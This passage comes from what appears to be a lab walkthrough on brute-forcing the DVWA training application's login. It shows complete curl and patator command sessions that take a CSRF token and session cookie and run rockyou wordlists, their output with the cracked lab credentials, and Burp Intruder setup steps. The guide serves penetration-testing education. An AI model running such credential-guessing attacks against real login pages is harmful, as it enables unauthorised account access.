&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# patator  http_fuzz  method=GET \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=admin&amp;amp;password=FILE0&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/rockyou.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x quit:fgrep!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Username and/or password incorrect.'&lt;/span&gt;,clen!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'-1'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;18:22:00 patator    INFO - Starting Patator v0.5 &lt;span class="o"&gt;(&lt;/span&gt;http://code.google.com/p/patator/&lt;span class="o"&gt;)&lt;/span&gt; at 2015-10-23 18:22 BST
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO -
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - code size:clen     &lt;span class="p"&gt;|&lt;/span&gt; candidate                        &lt;span class="p"&gt;|&lt;/span&gt;   num &lt;span class="p"&gt;|&lt;/span&gt; mesg
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - ----------------------------------------------------------------------
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5301:5032     &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;123456&lt;/span&gt;                           &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5214:4945     &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;12345&lt;/span&gt;                            &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5214:4945     &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;123456789&lt;/span&gt;                        &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5276:5007     &lt;span class="p"&gt;|&lt;/span&gt; password                         &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5214:4945     &lt;span class="p"&gt;|&lt;/span&gt; iloveyou                         &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5214:4945     &lt;span class="p"&gt;|&lt;/span&gt; princess                         &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5214:4945     &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;1234567&lt;/span&gt;                          &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5214:4945     &lt;span class="p"&gt;|&lt;/span&gt; rockyou                          &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5214:4945     &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;12345678&lt;/span&gt;                         &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5214:4945     &lt;span class="p"&gt;|&lt;/span&gt; abc123                           &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - Hits/Done/Skip/Fail/Size: 10/10/0/0/14344391, Avg: &lt;span class="m"&gt;22&lt;/span&gt; r/s, Time: 0h 0m 0s
&lt;/span&gt;&lt;span class="line"&gt;18:22:01 patator    INFO - To resume execution, pass --resume 2,2,2,2,2
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Patator Attack Command" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-18.png" /&gt;&lt;/p&gt;

&lt;p&gt;To match the brute force attempt of Hydra, where it was displaying the values tried, &lt;code&gt;-x ignore:fgrep='Username and/or password incorrect.'&lt;/code&gt; was not used. You can see what the correct value was to login (&lt;code&gt;password&lt;/code&gt;), based on the "page size:content length" reported back (&lt;code&gt;5276:5007&lt;/code&gt;), The first value is also different due to the extra line added in from DVWA core, which was noted when we did the baseline responses.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Multiple Users&lt;/strong&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# echo -e 'admin\n1337\ngordonb\npablo\nsmithy' &amp;gt; /root/users.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# patator  http_fuzz  method=GET \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/root/users.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/rockyou-40.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="nv"&gt;accept_cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x ignore:fgrep!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Welcome to the password protected area'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;18:55:21 patator    INFO - Starting Patator v0.5 &lt;span class="o"&gt;(&lt;/span&gt;http://code.google.com/p/patator/&lt;span class="o"&gt;)&lt;/span&gt; at 2015-10-23 18:55 BST
&lt;/span&gt;&lt;span class="line"&gt;18:55:21 patator    INFO -
&lt;/span&gt;&lt;span class="line"&gt;18:55:21 patator    INFO - code size:clen     &lt;span class="p"&gt;|&lt;/span&gt; candidate                        &lt;span class="p"&gt;|&lt;/span&gt;   num &lt;span class="p"&gt;|&lt;/span&gt; mesg
&lt;/span&gt;&lt;span class="line"&gt;18:55:21 patator    INFO - ----------------------------------------------------------------------
&lt;/span&gt;&lt;span class="line"&gt;18:55:22 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5278:5009     &lt;span class="p"&gt;|&lt;/span&gt; password:smithy                  &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:55:22 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5276:5007     &lt;span class="p"&gt;|&lt;/span&gt; password:admin                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:55:23 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5280:5011     &lt;span class="p"&gt;|&lt;/span&gt; abc123:gordonb                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;43&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:56:47 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5276:5007     &lt;span class="p"&gt;|&lt;/span&gt; letmein:pablo                    &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;2554&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;19:02:51 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5274:5005     &lt;span class="p"&gt;|&lt;/span&gt; charley:1337                     &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;13967&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;19:05:58 patator    INFO - Hits/Done/Skip/Fail/Size: 5/19785/0/0/19785, Avg: &lt;span class="m"&gt;31&lt;/span&gt; r/s, Time: 0h 10m 36s
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Multiple Users Patator" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-19.png" /&gt;&lt;/p&gt;

&lt;p&gt;Note, because the username and password values are hardcoded in the URL for the http_fuzz module, we are unable to use something like &lt;code&gt;-x free:user=...&lt;/code&gt; to skip over the value once there has been a successful login. This means, Patator will keep on making requests with a user after it has already found the password.&lt;/p&gt;

&lt;p&gt;Unlike Hydra, we can give a range of &lt;code&gt;Content-Length&lt;/code&gt; values to look for or ignore.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="L.strong.Burp.Proxy..strong."&gt;&lt;/a&gt;
&lt;h2&gt;&lt;strong&gt;Burp Proxy&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Burp Suite has a proxy tool, which is primarily a commercial tool, however, there is a "free license" edition. The free edition contains a limited amount of features and functions with various limits in place, one of which is a slower "intruder" attack speed. Burp Proxy has been around since August 2003.&lt;/p&gt;

&lt;p&gt;Burp mainly uses a graphic UI, which makes it harder to demonstrate how to use it (mouse clicking vs copying/pasting commands). This section really could benefit from a video, rather than a screenshot gallery.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Setup&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The first thing we need to-do, setup our web browser (Iceweasel/Firefox) to use Burp's proxy.

&lt;ul&gt;
&lt;li&gt;IP: &lt;code&gt;127.0.0.1&lt;/code&gt; (loopback by Burp's default), Port: &lt;code&gt;8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Using &lt;a href="https://getfoxyproxy.org/"&gt;FoxyProxy&lt;/a&gt; to switch profiles.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Proxy" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-21.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Burp needs a request to work with. Either we could write one out by hand (which would take a while), or we can capture a valid request and use that.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Using Iceweasel, make a request in the brute force form.

&lt;ul&gt;
&lt;li&gt;Values can be anything, however, in the example: username: &lt;code&gt;admin&lt;/code&gt;, password: &lt;code&gt;pass&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Burp by default will have intercept enabled, allowing us to inspect the request.&lt;/li&gt;
&lt;li&gt;Rather than allowing the request, we will send it to the Intruder

&lt;ul&gt;
&lt;li&gt;Actions -&gt; Send to Intruder.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Proxy Setup" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-22.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Next, we are telling Burp how to attack the target (using a single wordlist)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (tab) -&gt; 2 -&gt; Positions -&gt; Attack type: &lt;code&gt;sniper&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;Single list, going through each value one by one&lt;/li&gt;
&lt;li&gt;For more information about attack types: &lt;a href="https://portswigger.net/burp/help/intruder_positions.html"&gt;https://portswigger.net/burp/help/intruder_positions.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Press: &lt;code&gt;Clear §&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Highlight: &lt;code&gt;password=pass&lt;/code&gt; -&gt; Press: &lt;code&gt;Add §&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;Result: &lt;code&gt;password=§pass§&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Proxy Target" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-23.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;At this stage, we are telling what values to attack with (going to use the original three debugging values)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (tab) -&gt; 2 -&gt; Payloads -&gt; Payload Sets

&lt;ul&gt;
&lt;li&gt;Payload set: &lt;code&gt;1&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Payload type: &lt;code&gt;Simple list&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Payload Options [Simple list]

&lt;ul&gt;
&lt;li&gt;Add: &lt;code&gt;admin&lt;/code&gt;, &lt;code&gt;&amp;lt;blank&amp;gt;&lt;/code&gt; &amp;amp; &lt;code&gt;password&lt;/code&gt; as three separate values&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Proxy Values" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-24.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Now we are going to alter the options as to how Burp behaves. This is an optional stage; however, it makes the output easier to see.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable the baseline request&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (tab) -&gt; 2 -&gt; Options -&gt; Untick: Make unmodified baseline request&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Proxy Intruder" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-25.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Extract values from the page&lt;/strong&gt;: In Burp's results, it will display the following text in the output. See why later.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (tab) -&gt; 2 -&gt; Options -&gt; Grep - Extract -&gt; Add&lt;/li&gt;
&lt;li&gt;Fetch Response&lt;/li&gt;
&lt;li&gt;Start after expression: &lt;code&gt;&amp;lt;pre&amp;gt;&amp;lt;br /&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;End at delimiter: &lt;code&gt;&amp;lt;/pre&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Okay&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Proxy Rules" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-26.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Now we are ready to start the attack!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (Top Menu) -&gt; Start attack&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;em&gt;Note, there will be an alert explaining that the speed will be limited due to the "free edition" of Burp.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="Burp Proxy Attack" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-27.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;: We can see based on the "&lt;code&gt;Length&lt;/code&gt;" and "&lt;code&gt;&amp;lt;pre&amp;gt;&amp;lt;br /&amp;gt;&lt;/code&gt;", which request (and payload) was "different" (aka a successful login).&lt;/p&gt;

&lt;p&gt;&lt;img alt="Burp Proxy Results" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-28.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Single User - admin&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now, let's pretend we didn't already know what the correct login was and use a wordlist.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (tab) -&gt; 2 -&gt; Payloads -&gt; Payload set: &lt;code&gt;1&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Payload Options [Simple list]

&lt;ul&gt;
&lt;li&gt;Clear.&lt;/li&gt;
&lt;li&gt;Load: &lt;code&gt;/usr/share/seclists/Passwords/rockyou-5.txt&lt;/code&gt; -&gt; Open&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Then, to start the attack (missing a screenshot):&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note, there will be an alert explaining that the speed will be limited due to the "free edition" of Burp.&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (Top Menu) -&gt; Start attack&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Single User" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-29.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;: Again, you can see the request (and payload) which caused a different result (aka a successful login).&lt;/p&gt;

&lt;p&gt;Note, Burp will continue to go through the wordlist until it reaches the end. It will not stop at a "valid login". This might not be the case in later versions (or I missed a method to stop this from happening).&lt;/p&gt;

&lt;p&gt;&lt;img alt="Burp Single User Results" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-30.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

